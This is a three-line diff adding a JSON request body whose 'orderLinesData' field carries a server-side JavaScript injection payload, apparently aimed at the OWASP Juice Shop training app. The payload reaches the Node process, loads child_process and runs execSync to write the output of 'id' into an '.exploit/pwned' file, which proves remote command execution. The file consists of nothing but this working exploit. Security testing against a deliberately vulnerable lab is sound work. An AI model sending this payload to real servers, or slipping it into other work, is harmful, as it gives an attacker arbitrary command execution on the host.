@@ -1,0 +1,3 @@
+{
+  "orderLinesData": "new Function('return process')().mainModule.require('child_process').execSync('id > /app/juice-shop-local/.exploit/pwned')"
+}
